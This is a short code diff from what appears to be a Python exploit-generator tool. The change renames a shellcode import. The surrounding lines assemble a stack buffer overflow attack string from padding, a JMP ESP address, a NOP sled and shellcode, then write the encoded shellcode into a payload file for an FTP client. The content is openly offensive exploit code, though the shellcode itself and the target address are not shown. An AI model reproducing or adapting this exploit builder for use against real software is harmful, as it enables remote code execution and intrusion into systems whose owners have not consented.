@@ -6,7 +6,7 @@ import string
 import socket 
 import time
 import readline
-from shellcode import shellcode 
+from shell_code import shell_code 
 from Banner import Banner
 import shutil
 import fileinput
@@ -176,7 +176,7 @@ class SERVER_BUFFER():
                  self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address) 
                  self.NO_Operation = self.NO_Operation*"\x90" 
                  self.count = self.NO_Operation.count("\x90")  
-                 attack = Start_string+self.jump_address+ self.NO_Operation +shellcode
+                 attack = Start_string+self.jump_address+ self.NO_Operation +shell_code
                  time.sleep(2) 
                  print Y+'\n[+]'+W+B+'attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ "A"+W+O+'+'+W+B+\
                  ' JMP ESP ='+W,Y+self.display+W,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O+'+'+W+P+' shellcode'+W
@@ -201,7 +201,7 @@ class SERVER_BUFFER():
       def auto_write(self): 
               
                 try:                
-                  shell =shellcode.encode("hex")
+                  shell =shell_code.encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                   self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                   copy_format= shutil.copy("./FTP.Client_payload.txt","./FTP.Client_paylaod.py")
